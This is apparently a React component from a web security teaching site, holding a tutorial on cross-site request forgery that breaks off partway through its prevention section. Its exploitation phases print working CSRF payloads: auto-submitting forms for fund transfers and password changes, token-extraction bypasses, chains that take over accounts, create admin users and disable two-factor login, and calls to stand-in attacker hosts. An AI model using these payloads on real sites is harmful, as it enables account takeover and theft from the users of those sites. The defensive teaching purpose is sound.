
import React from 'react';
import { ShieldAlert } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const CSRF: React.FC = () => {
  return (
    <section id="csrf" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Request Forgery (CSRF)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            CSRF attacks trick authenticated users into executing unwanted actions on a web application where they are currently authenticated.
            This exploits the trust a website has in a user&apos;s browser, making the victim perform state-changing requests like fund transfers,
            password changes, or account modifications without their knowledge or consent. CSRF is particularly dangerous because it leverages
            the victim&apos;s existing authenticated session to perform malicious actions.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker&apos;s Goal</AlertTitle>
            <AlertDescription>
              Force authenticated users to perform unintended actions such as changing passwords, transferring funds, 
              modifying account settings, or performing administrative functions without their knowledge.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Mechanics */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How CSRF Attacks Work</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
            <h5 className="font-semibold mb-2">Attack Flow:</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li><strong>User Authentication:</strong> The victim logs into a vulnerable website (e.g., banking site) and receives a session cookie</li>
              <li><strong>Session Persistence:</strong> Without logging out, the victim visits a malicious website controlled by the attacker</li>
              <li><strong>Malicious Request:</strong> The malicious site contains code that automatically submits a form or sends a request to the vulnerable site</li>
              <li><strong>Automatic Cookie Inclusion:</strong> The victim&apos;s browser automatically includes the session cookies when making the request</li>
              <li><strong>Server Processing:</strong> The vulnerable site processes the request as if the victim intentionally submitted it</li>
              <li><strong>Action Execution:</strong> The malicious action is completed using the victim&apos;s authenticated session</li>
            </ol>
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="State-Changing Forms"
              description="Any form that performs actions like password changes, profile updates, money transfers, or administrative functions without CSRF protection."
              severity="high"
            />
            <SecurityCard
              title="RESTful APIs"
              description="API endpoints that rely solely on cookies for authentication and perform state-changing operations via GET/POST requests."
              severity="high"
            />
            <SecurityCard
              title="Single Page Applications"
              description="SPAs that make AJAX requests without including CSRF tokens or relying only on cookie-based authentication."
              severity="medium"
            />
            <SecurityCard
              title="Administrative Interfaces"
              description="Admin panels and management interfaces that perform privileged operations without proper CSRF protection."
              severity="high"
            />
          </div>
        </div>

        {/* Types of CSRF Attacks */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of CSRF Attacks</h4>
          <Tabs defaultValue="classic">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="classic">Classic CSRF</TabsTrigger>
              <TabsTrigger value="ajax">AJAX-based CSRF</TabsTrigger>
              <TabsTrigger value="json">JSON CSRF</TabsTrigger>
              <TabsTrigger value="login">Login CSRF</TabsTrigger>
            </TabsList>
            
            <TabsContent value="classic" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Classic Form-Based CSRF</h5>
                  <p className="text-sm mb-3">
                    Traditional CSRF attacks using HTML forms that automatically submit when the victim visits the attacker&apos;s page.
                    These attacks work because browsers automatically include cookies with form submissions to the target domain.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Scenario:</h6>
                  <CodeExample
                    language="html"
                    title="Malicious Website Code"
                    code={`<!-- Attacker's website contains this hidden form -->
<form action="https://bank.example.com/transfer" method="POST" id="exploit-form">
  <input type="hidden" name="recipient" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="memo" value="Payment">
</form>

<script>
  // Automatically submit the form when page loads
  document.getElementById("exploit-form").submit();
</script>

<!-- Alternative methods -->
<!-- Image-based GET request -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" style="display:none">

<!-- Link that triggers on hover -->
<a href="https://bank.example.com/delete-account" onmouseover="this.click()">Win a Prize!</a>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all state-changing forms and their required parameters</li>
                    <li>Create a test HTML page with a form targeting the vulnerable endpoint</li>
                    <li>Ensure you&apos;re logged into the target application in the same browser</li>
                    <li>Visit your test page and check if the action was performed</li>
                    <li>Monitor network traffic to confirm the request was sent with cookies</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="ajax" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">AJAX-Based CSRF</h5>
                  <p className="text-sm mb-3">
                    Modern CSRF attacks using JavaScript to make XMLHttpRequest or fetch API calls. 
                    These are limited by the Same-Origin Policy but can still work for simple requests 
                    or when CORS is misconfigured.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Examples:</h6>
                  <CodeExample
                    language="javascript"
                    title="AJAX CSRF Attack"
                    code={`// Simple CSRF using fetch API
fetch('https://vulnerable-site.com/api/change-password', {
  method: 'POST',
  credentials: 'include', // This includes cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'new_password=hacked123&confirm_password=hacked123'
});

// CSRF with XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://vulnerable-site.com/api/transfer');
xhr.withCredentials = true; // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('recipient=attacker&amount=5000');

// CSRF via dynamically created form
function performCSRF() {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://vulnerable-site.com/admin/delete-user';
  
  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'user_id';
  input.value = '123';
  
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Limitations and Bypasses:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Simple requests (GET, POST with specific content types) bypass CORS preflight</li>
                    <li>Custom headers trigger preflight, but simple headers don&apos;t</li>
                    <li>Misconfigured CORS policies may allow cross-origin requests</li>
                    <li>WebSocket connections may not be subject to same restrictions</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="json" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">JSON CSRF Attacks</h5>
                  <p className="text-sm mb-3">
                    Attacks targeting APIs that accept JSON payloads. While these usually trigger CORS preflight checks,
                    certain techniques can bypass these protections or exploit misconfigured CORS policies.
                  </p>
                  
                  <h6 className="font-medium mb-2">Bypass Techniques:</h6>
                  <CodeExample
                    language="javascript"
                    title="JSON CSRF Bypass Methods"
                    code={`// Method 1: Using form with text/plain content type (simple request)
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://api.example.com/user/update';
form.enctype = 'text/plain';

var input = document.createElement('input');
input.name = '{"email":"attacker@evil.com","role":"admin"}';
input.value = '';
form.appendChild(input);

document.body.appendChild(form);
form.submit();

// Method 2: Exploiting Flash or other plugins
// Using Flash to send arbitrary content-type requests
var flashObject = document.createElement('object');
flashObject.data = 'https://attacker.com/csrf.swf';
// Flash can make requests without CORS restrictions

// Method 3: Exploiting JSONP endpoints
function jsonpCallback(data) {
  // This gets called with the response data
  console.log('Stolen data:', data);
}

var script = document.createElement('script');
script.src = 'https://vulnerable-site.com/api/user-data?callback=jsonpCallback';
document.head.appendChild(script);

// Method 4: Content-Type manipulation
// Some servers accept JSON with wrong content type
fetch('https://vulnerable-api.com/endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'json={"malicious":"payload"}'
});`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="login" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Login CSRF</h5>
                  <p className="text-sm mb-3">
                    A variant where the attacker forces the victim to log into the attacker&apos;s account, 
                    potentially allowing the attacker to access data the victim enters while logged into the wrong account.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Flow:</h6>
                  <CodeExample
                    language="html"
                    title="Login CSRF Attack"
                    code={`<!-- Force victim to log into attacker's account -->
<form action="https://target-site.com/login" method="POST" id="login-csrf">
  <input type="hidden" name="username" value="attacker-username">
  <input type="hidden" name="password" value="attacker-password">
</form>

<script>
  // Automatically submit login form
  document.getElementById("login-csrf").submit();
</script>

<!-- After this attack:
1. Victim is logged into attacker's account
2. Victim might enter sensitive information (credit card, etc.)
3. Attacker can later log in and see this information
4. Victim might not notice they're in the wrong account -->`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Impact Scenarios:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Victim enters payment information into attacker&apos;s account</li>
                    <li>Victim uploads files to attacker&apos;s cloud storage</li>
                    <li>Victim&apos;s search history is saved to attacker&apos;s account</li>
                    <li>Victim makes purchases that benefit the attacker</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Comprehensive Step-by-Step Testing Guide */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Complete CSRF Exploitation Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Phase 1: Reconnaissance</TabsTrigger>
              <TabsTrigger value="identification">Phase 2: Identification</TabsTrigger>
              <TabsTrigger value="analysis">Phase 3: Analysis</TabsTrigger>
              <TabsTrigger value="exploitation">Phase 4: Exploitation</TabsTrigger>
              <TabsTrigger value="verification">Phase 5: Verification</TabsTrigger>
              <TabsTrigger value="escalation">Phase 6: Escalation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Initial Reconnaissance and Target Mapping</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Information Gathering:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Map out the complete application structure and functionality</li>
                    <li>Identify all authentication mechanisms and session management</li>
                    <li>Document user roles and privilege levels</li>
                    <li>Catalog all forms, buttons, and interactive elements</li>
                    <li>Understand the application&apos;s business logic and critical functions</li>
                    <li>Identify single-page application (SPA) vs traditional multi-page architecture</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Technology Stack Analysis:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Determine server-side technology (PHP, ASP.NET, Node.js, Python, etc.)</li>
                    <li>Identify client-side frameworks (React, Angular, Vue.js)</li>
                    <li>Check for Content Management Systems (WordPress, Drupal, etc.)</li>
                    <li>Analyze HTTP headers for security configurations</li>
                    <li>Look for API endpoints and their documentation</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">User Journey Mapping:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Create user accounts with different privilege levels</li>
                    <li>Map out complete user workflows for each role</li>
                    <li>Document all state-changing operations</li>
                    <li>Identify high-value targets (admin functions, financial operations)</li>
                    <li>Note any multi-step processes or workflows</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="identification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Systematic Vulnerability Identification</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Form-Based Targets:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Password change forms and account settings</li>
                    <li>Profile update and personal information forms</li>
                    <li>Financial transaction forms (transfers, payments)</li>
                    <li>Administrative functions (user management, system settings)</li>
                    <li>File upload and document management features</li>
                    <li>Email settings and notification preferences</li>
                    <li>Two-factor authentication setup/disable functions</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">API Endpoint Discovery:</h6>
                  <CodeExample
                    language="bash"
                    title="API Endpoint Discovery Techniques"
                    code={`# Using Burp Suite to capture all requests
# 1. Configure browser proxy to Burp Suite
# 2. Navigate through all application functions while logged in
# 3. Review Burp Site Map for all discovered endpoints

# JavaScript console inspection for SPA applications
# Check for API calls in browser developer tools
# Look for patterns like:
/api/user/update
/api/account/settings
/api/admin/users
/api/transfer/funds

# Common API endpoint patterns to test
GET /api/user/profile       # Usually safe from CSRF
POST /api/user/update       # Potential CSRF target
PUT /api/user/password      # High-value CSRF target
DELETE /api/user/account    # Critical CSRF target
POST /api/admin/promote     # Privilege escalation target

# Check for REST API documentation
/api/docs
/swagger
/api-docs
/documentation`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Mobile and Alternative Interfaces:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Mobile-specific endpoints and functionalities</li>
                    <li>Alternative interfaces (admin panels, partner portals)</li>
                    <li>Legacy endpoints that might lack modern protections</li>
                    <li>Third-party integrations and webhooks</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="analysis" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Protection Mechanism Analysis</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">CSRF Token Analysis:</h6>
                  <CodeExample
                    language="javascript"
                    title="Token Analysis Script"
                    code={`// Automated CSRF token analysis
function analyzeCsrfProtection() {
  // Check for tokens in forms
  const forms = document.querySelectorAll('form');
  forms.forEach((form, index) => {
    console.log(\`Form \${index + 1}:\`);
    
    // Look for hidden CSRF token fields
    const tokenFields = form.querySelectorAll('input[type="hidden"]');
    tokenFields.forEach(field => {
      if (field.name.toLowerCase().includes('csrf') || 
          field.name.toLowerCase().includes('token') ||
          field.name === '_token' || 
          field.name === 'authenticity_token') {
        console.log(\`  CSRF Token found: \${field.name} = \${field.value}\`);
      }
    });
    
    // Check form action and method
    console.log(\`  Action: \${form.action}\`);
    console.log(\`  Method: \${form.method}\`);
  });
  
  // Check for tokens in meta tags
  const metaToken = document.querySelector('meta[name="csrf-token"]');
  if (metaToken) {
    console.log(\`Meta CSRF token: \${metaToken.getAttribute('content')}\`);
  }
}

// Run the analysis
analyzeCsrfProtection();`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Cookie Security Analysis:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Check SameSite attribute values (None, Lax, Strict)</li>
                    <li>Verify HttpOnly and Secure flags</li>
                    <li>Test cookie behavior in cross-site contexts</li>
                    <li>Analyze session token entropy and randomness</li>
                    <li>Check for session fixation vulnerabilities</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Header-Based Protections:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Origin header validation testing</li>
                    <li>Referer header validation and bypass attempts</li>
                    <li>Custom header requirements (X-Requested-With)</li>
                    <li>Content-Type validation strictness</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Systematic Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Basic Exploitation Techniques:</h6>
                  <CodeExample
                    language="html"
                    title="Progressive CSRF Testing Template"
                    code={`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Testing Laboratory</title>
    <style>
        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ccc; }
        .hidden-form { display: none; }
    </style>
</head>
<body>
    <h1>CSRF Exploitation Testing</h1>
    
    <!-- Test 1: Basic Form Submission -->
    <div class="test-section">
        <h3>Test 1: Direct Form Submission</h3>
        <form action="https://target.com/change-password" method="POST" id="test1">
            <input type="hidden" name="new_password" value="csrf_test_123">
            <input type="hidden" name="confirm_password" value="csrf_test_123">
            <button type="submit">Test Password Change</button>
        </form>
    </div>
    
    <!-- Test 2: Auto-submit Form -->
    <div class="test-section">
        <h3>Test 2: Automatic Form Submission</h3>
        <form action="https://target.com/transfer" method="POST" id="test2" class="hidden-form">
            <input type="hidden" name="recipient" value="attacker@test.com">
            <input type="hidden" name="amount" value="1.00">
        </form>
        <button onclick="document.getElementById('test2').submit()">Trigger Transfer</button>
    </div>
    
    <!-- Test 3: Image-based GET Request -->
    <div class="test-section">
        <h3>Test 3: Image-based Attack</h3>
        <img src="https://target.com/delete-user?id=123" style="display:none" onerror="console.log('Request sent')">
    </div>
    
    <!-- Test 4: JavaScript Fetch API -->
    <div class="test-section">
        <h3>Test 4: AJAX-based Attack</h3>
        <button onclick="performAjaxCSRF()">Execute AJAX CSRF</button>
    </div>
    
    <script>
        function performAjaxCSRF() {
            fetch('https://target.com/api/user/update', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'email=attacker@evil.com&role=admin'
            }).then(response => {
                console.log('CSRF request completed:', response.status);
            }).catch(error => {
                console.log('CSRF request failed:', error);
            });
        }
        
        // Auto-execute on page load
        window.onload = function() {
            // Uncomment to auto-execute tests
            // document.getElementById('test2').submit();
        };
    </script>
</body>
</html>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Advanced Bypass Techniques:</h6>
                  <CodeExample
                    language="javascript"
                    title="CSRF Protection Bypass Methods"
                    code={`// Method 1: Token Extraction and Reuse
async function extractAndReuseToken() {
    try {
        // First, fetch the page to extract CSRF token
        const response = await fetch('https://target.com/profile', {
            credentials: 'include'
        });
        const html = await response.text();
        
        // Extract token using regex
        const tokenMatch = html.match(/name="csrf_token" value="([^"]+)"/);
        if (tokenMatch) {
            const token = tokenMatch[1];
            console.log('Extracted token:', token);
            
            // Use token in malicious request
            return fetch('https://target.com/change-email', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: \`csrf_token=\${token}&new_email=attacker@evil.com\`
            });
        }
    } catch (error) {
        console.log('Token extraction failed:', error);
    }
}

// Method 2: Subdomain-based Origin Bypass
function subdomainBypass() {
    // If target.com allows requests from *.target.com
    // Set up attack on attacker-controlled subdomain
    
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/admin/promote-user';
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'user_id';
    input.value = 'attacker_user_id';
    
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}

// Method 3: Flash-based CSRF (Legacy systems)
function flashBasedCSRF() {
    // Create Flash object that can bypass CORS restrictions
    const flashObject = document.createElement('object');
    flashObject.type = 'application/x-shockwave-flash';
    flashObject.data = 'https://attacker.com/csrf-exploit.swf';
    
    // Pass parameters to Flash
    const param = document.createElement('param');
    param.name = 'flashvars';
    param.value = 'target=https://target.com/api/sensitive&method=POST&data=malicious_payload';
    
    flashObject.appendChild(param);
    document.body.appendChild(flashObject);
}

// Method 4: WebSocket CSRF
function websocketCSRF() {
    const ws = new WebSocket('wss://target.com/websocket');
    
    ws.onopen = function() {
        // Send malicious WebSocket message
        ws.send(JSON.stringify({
            action: 'transfer_funds',
            recipient: 'attacker_account',
            amount: 10000
        }));
    };
}

// Method 5: DNS Rebinding Attack
function dnsRebindingCSRF() {
    // Advanced technique: Use DNS rebinding to bypass origin checks
    // Requires control over DNS records
    
    // Initial request to attacker domain that resolves to target IP
    fetch('http://csrf.attacker.com/admin/delete-all-users', {
        method: 'POST',
        credentials: 'include'
    });
}`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="verification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 5: Impact Verification and Documentation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Verification Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Confirm the malicious action was actually performed</li>
                    <li>Check application logs for evidence of the attack</li>
                    <li>Verify that no user interaction was required beyond visiting the page</li>
                    <li>Test the attack across different browsers and devices</li>
                    <li>Document the complete attack flow with screenshots</li>
                    <li>Record network traffic showing the successful CSRF request</li>
                    <li>Verify the attack works with different user privilege levels</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Impact Assessment Framework:</h6>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
                    <div className="p-3 bg-red-900/20 rounded">
                      <h7 className="font-medium text-red-400">Critical Impact</h7>
                      <ul className="list-disc pl-4 text-xs mt-1">
                        <li>Administrative account takeover</li>
                        <li>Financial transactions</li>
                        <li>System configuration changes</li>
                        <li>User privilege escalation</li>
                      </ul>
                    </div>
                    <div className="p-3 bg-yellow-900/20 rounded">
                      <h7 className="font-medium text-yellow-400">High Impact</h7>
                      <ul className="list-disc pl-4 text-xs mt-1">
                        <li>Password changes</li>
                        <li>Email modifications</li>
                        <li>Profile data changes</li>
                        <li>Security setting modifications</li>
                      </ul>
                    </div>
                  </div>
                  
                  <h6 className="font-medium mb-2 mt-3">Evidence Collection:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>HTTP request/response logs showing successful CSRF</li>
                    <li>Before/after screenshots of affected data</li>
                    <li>Browser developer tools network tab recordings</li>
                    <li>Application audit logs if accessible</li>
                    <li>Video recording of the complete attack flow</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="escalation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 6: Attack Escalation and Chaining</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Privilege Escalation via CSRF:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Chain CSRF with other vulnerabilities (XSS, IDOR)</li>
                    <li>Use CSRF to modify admin user accounts</li>
                    <li>Exploit CSRF in password reset functionality</li>
                    <li>Leverage CSRF to disable security features</li>
                    <li>Use CSRF to create backdoor accounts</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Advanced Attack Scenarios:</h6>
                  <CodeExample
                    language="javascript"
                    title="CSRF Attack Chaining"
                    code={`// Scenario 1: CSRF + XSS for Account Takeover
function csrfXssChain() {
    // Step 1: Use CSRF to change victim's email to attacker-controlled
    const emailForm = document.createElement('form');
    emailForm.action = 'https://target.com/change-email';
    emailForm.method = 'POST';
    
    const emailInput = document.createElement('input');
    emailInput.type = 'hidden';
    emailInput.name = 'new_email';
    emailInput.value = 'attacker@evil.com';
    
    emailForm.appendChild(emailInput);
    document.body.appendChild(emailForm);
    emailForm.submit();
    
    // Step 2: Trigger password reset to attacker-controlled email
    setTimeout(() => {
        const resetForm = document.createElement('form');
        resetForm.action = 'https://target.com/password-reset';
        resetForm.method = 'POST';
        
        const resetInput = document.createElement('input');
        resetInput.type = 'hidden';
        resetInput.name = 'email';
        resetInput.value = 'attacker@evil.com';
        
        resetForm.appendChild(resetInput);
        document.body.appendChild(resetForm);
        resetForm.submit();
    }, 2000);
}

// Scenario 2: CSRF to Create Admin User
function createAdminViaCSRF() {
    // Target admin user creation endpoint
    const adminForm = document.createElement('form');
    adminForm.action = 'https://target.com/admin/create-user';
    adminForm.method = 'POST';
    
    const inputs = [
        { name: 'username', value: 'csrf_admin' },
        { name: 'password', value: 'AttackerPassword123!' },
        { name: 'email', value: 'admin@attacker.com' },
        { name: 'role', value: 'administrator' },
        { name: 'permissions', value: 'all' }
    ];
    
    inputs.forEach(inputData => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = inputData.name;
        input.value = inputData.value;
        adminForm.appendChild(input);
    });
    
    document.body.appendChild(adminForm);
    adminForm.submit();
}

// Scenario 3: Mass CSRF Attack via Social Engineering
function massCSRFCampaign() {
    // Multi-target CSRF attack
    const targets = [
        'https://target.com/transfer-funds',
        'https://target.com/change-password',
        'https://target.com/disable-2fa'
    ];
    
    targets.forEach((target, index) => {
        setTimeout(() => {
            const form = document.createElement('form');
            form.action = target;
            form.method = 'POST';
            
            // Add appropriate inputs based on target
            if (target.includes('transfer')) {
                form.innerHTML = \`
                    <input type="hidden" name="recipient" value="attacker">
                    <input type="hidden" name="amount" value="100">
                \`;
            } else if (target.includes('password')) {
                form.innerHTML = \`
                    <input type="hidden" name="new_password" value="hacked123">
                \`;
            } else if (target.includes('2fa')) {
                form.innerHTML = \`
                    <input type="hidden" name="disable_2fa" value="true">
                \`;
            }
            
            document.body.appendChild(form);
            form.submit();
        }, index * 1000); // Stagger requests
    });
}`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Persistence Techniques:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Use CSRF to add persistent backdoor accounts</li>
                    <li>Modify application settings to maintain access</li>
                    <li>Create webhook endpoints for continued exploitation</li>
                    <li>Add attacker&apos;s SSH keys via CSRF if functionality exists</li>
                    <li>Modify notification settings to hide malicious activities</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Comprehensive Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive CSRF Prevention Strategies</h4>
          
          <div className="space-y-6">
            {/* Primary Defenses */}
            <div>
              <h5 className="text-lg font-semibold mb-3">Primary Defense Mechanisms</h5>
              
              <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
                <h6 className="font-medium mb-2">1. Synchronizer Token Pattern (CSRF Tokens)</h6>
                <p className="text-sm mb-3">
                  The most robust CSRF protection involves generating unique, unpredictable tokens for each user session 
                  and validating these tokens on every state-changing request. This method is effective because attackers 
                  cannot guess or obtain these tokens through cross-site requests due to the Same-Origin Policy.
                </p>
                
                <h7 className="font-medium text-sm mb-2">Implementation Best Practices:</h7>
                <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
                  <li>Generate cryptographically secure random tokens with sufficient entropy (at least 128 bits)</li>
                  <li>Use a different token for each form or session, never reuse tokens</li>
                  <li>Store tokens server-side tied to the user&apos;s session</li>
                  <li>Validate tokens on every state-changing request (POST, PUT, DELETE)</li>
                  <li>Implement token expiration to limit the window of vulnerability</li>
                  <li>Use constant-time comparison to prevent timing attacks</li>
                </ul>
                
                <Tabs defaultValue="tokens">
                  <TabsList className="bg-slate-200 dark:bg-slate-800">
                    <TabsTrigger value="tokens">CSRF Tokens</TabsTrigger>
                    <TabsTrigger value="samesite">SameSite Cookies</TabsTrigger>
                    <TabsTrigger value="headers">Custom Headers</TabsTrigger>
                    <TabsTrigger value="validation">Origin Validation</TabsTrigger>
                  </TabsList>
                  
                  <TabsContent value="tokens" className="mt-4">
                    <CodeExample
                      language="javascript"
                      title="CSRF Token Implementation"
                      code={`// Express.js with CSRF protection
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const session = require('express-session');

const app = express();
app.use(cookieParser());

// Session configuration
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  }
}));

// Setup CSRF protection with enhanced security
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  },
  // Custom token generation
  value: (req) => {
    return req.body._csrf || req.query._csrf || req.headers['x-csrf-token'];
  }
});

// Apply CSRF protection to all state-changing routes
app.use('/api/', csrfProtection);

// Provide CSRF token to client applications
app.get('/api/csrf-token', (req, res) => {
  res.json({ 
    csrfToken: req.csrfToken(),
    expires: new Date(Date.now() + 3600000) // 1 hour
  });
});

// Protected endpoint example
app.post('/api/transfer', csrfProtection, (req, res) => {
  const { recipient, amount } = req.body;
  
  // Additional validation
  if (!recipient || !amount || amount <= 0) {
    return res.status(400).json({ error: 'Invalid transfer parameters' });
  }
  
  // CSRF token is automatically validated by middleware
  try {
    processTransfer(req.user.id, recipient, amount);
    res.json({ success: true, message: 'Transfer completed successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Transfer failed' });
  }
});

// Manual token validation for custom scenarios
function validateCsrfToken(req, res, next) {
  const token = req.headers['x-csrf-token'] || 
                req.body._csrf || 
                req.query._csrf;
  const storedToken = req.session.csrfSecret;
  
  if (!token || !storedToken) {
    return res.status(403).json({ 
      error: 'CSRF token missing',
      code: 'CSRF_TOKEN_MISSING'
    });
  }
  
  // Use constant-time comparison to prevent timing attacks
  if (!crypto.timingSafeEqual(Buffer.from(token), Buffer.from(storedToken))) {
    return res.status(403).json({ 
      error: 'Invalid CSRF token',
      code: 'CSRF_TOKEN_INVALID'
    });
  }
  
  next();
}

// Client-side token handling
app.get('/profile', (req, res) => {
  res.render('profile', { 
    csrfToken: req.csrfToken(),
    user: req.user 
  });
});`}
                    />
                  </TabsContent>
                  
                  <TabsContent value="samesite" className="mt-4">
                    <div className="space-y-4">
                      <div className="p-4 bg-cybr-muted/50 rounded-md">
                        <h6 className="font-medium mb-2">SameSite Cookie Attribute</h6>
                        <p className="text-sm mb-3">
                          The SameSite attribute provides a robust defense against CSRF attacks by controlling when cookies are sent with cross-site requests. 
